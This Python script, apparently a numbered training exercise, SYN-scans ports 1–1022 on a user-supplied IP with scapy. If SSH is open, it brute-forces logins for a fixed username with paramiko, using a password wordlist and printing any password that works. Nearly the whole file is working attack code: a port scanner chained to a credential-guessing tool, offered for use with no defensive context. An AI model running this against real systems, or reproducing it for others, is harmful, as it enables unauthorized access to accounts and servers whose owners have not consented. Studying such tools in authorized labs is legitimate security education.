import paramiko
from scapy.all import *


# TASK 4: create target variable
target = input("What is your target today? [IP]:  ")

# TASK 5: create registerd_ports variable
registered_ports = range(1, 1023)

# TASK 6: create empty list for open ports
open_ports = []


# TASK 7: create scan_port function
def scan_port(port: int):
    source_port = RandShort()
    # TASK 8: set conf.verb
    conf.verb = 0
    # TASK 9: create sync packet
    sync_packet = sr1(
        IP(dst=target) / TCP(sport=source_port, dport=port, flags="S"), timeout=0.5
    )

    # TASK 10: check if packet exists
    if not sync_packet:
        return False

    # TASK 11: check if TCP layer exist
    if not sync_packet.haslayer(TCP):
        return False

    # TASK 12: check if there is SYN_ACK flag
    SYN_ACK = 0x12
    if sync_packet[TCP].flags == SYN_ACK:
        print(f"Port {port} is open")
        # TASK 13: send RST flag to close connection
        sr(IP(dst=target) / TCP(sport=source_port, dport=port, flags="R"), timeout=2)
        return True
    return False


# TASK 14: create target avaliability function
def target_avaliable():
    conf.verb = 0
    # TASK 15: use try except block
    try:
        # TASK 18: send ICMP packet
        icmp_pkt = sr1(IP(dst=target) / ICMP(), timeout=3)
    except Exception as e:
        # TASK 16: print excetpion and return False
        print(e)
        return False

    # TASK 19: check if ICMP succesfully sent
    return True if icmp_pkt else False


# TASK 26: create bf function
def brut_force(port: int):
    print("[INFO] Start BF")
    # TASK 27: open file with passwords
    with open("password_list.txt", "r") as f:
        # TASK 28: assigne password to varaible
        # NOTE: IMO there is no point to keep file open when I try connect over SSH
        #       I have passwords already in variable ...
        passwords = [p.rstrip("\n") for p in f.readlines()]
        # TASK 29: set user variable
        user = "user_i_dont_like"
        # TASK 30: create new ssh client
        ssh_conn = paramiko.SSHClient()
        # TASK 31: set ssh policy in case the host is unknonw (missing in knonw_hosts file)
        ssh_conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # TASK 32: iterate throut passwords
        for password in passwords:
            # TASK 33: use try exept block
            try:
                # TASK 34: connect to ssh server and authenticate to it
                ssh_conn.connect(
                    target, port=int(port), username=user, password=password, timeout=1
                )
                # TASK 35: print success msg
                print(f"[SUCCESS] Password: {password}")
                # TASK 36: close connection
                ssh_conn.close()
                # TASK 37: if I found password there is no point to test others
                break
            except Exception as e:
                print(e)
                # TASK 33: print message on exception
                print(f"[FAILED] Password: {password}")


# TASK 20: test if target avaliable
if target_avaliable():
    print("[INFO] Target avaliable")
    # TASK 21: iterate over ports to check
    print("[INFO] Start scanning...")
    for p in registered_ports:
        # TASK 22: add status vairable with scan result
        status = scan_port(p)
        # TASK 23: note port if scan status True
        if status:
            open_ports.append(p)
    # TASK 24: print sacn end msg
    print(f"[INFO] Saning of target {target} finished")
    # TASK 38: check if port 22 exists
    if 22 in open_ports:
        print("[INFO] Port 22 is open")
        while True:
            try_brut_force = input(">>> Wanna try BF attack [Y/N]: ")
            # TASK 39: check user input about BF
            if try_brut_force.upper() == "Y":
                # TASK 40: run BF if user input y or Y
                brut_force(22)
                break
            elif try_brut_force.upper() == "N":
                # Brake the loop is N or n
                break
    print(f"[INFO] Open ports: {open_ports}")
